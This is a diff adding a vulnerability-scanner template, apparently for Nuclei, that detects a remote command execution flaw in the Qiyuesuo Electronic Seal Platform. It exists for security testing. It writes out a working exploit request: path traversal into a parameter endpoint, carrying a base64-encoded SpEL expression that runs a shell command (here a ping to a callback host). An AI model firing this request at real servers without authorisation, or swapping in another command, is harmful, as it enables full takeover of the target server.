@@ -1,0 +1,33 @@
+id: qiyuesuo-param-edits-rce
+
+info:
+  name: Qiyuesuo Electronic Seal Platform param/edits RCE
+  author: Co5mos
+  severity: critical
+  description: |
+    Qiyuesuo Electronic Seal Platform's `param/edits` endpoint has a remote command execution vulnerability that allows attackers to execute arbitrary code on the server, potentially gaining full control over the web server.
+  reference:
+    - https://1oecho.github.io/oYmYrVh51/
+  metadata:
+    fofa-query: app="契约锁-电子签署平台"
+  tags: qiyuesuo, rce
+
+variables:
+  payload: "T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')"
+  base64_payload: "{{base64(payload)}}"
+
+http:
+  - raw:
+      - |
+        POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 32990
+
+        {"id":"2","params":[{"expression":"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='{{base64_payload}}';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();"}]}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
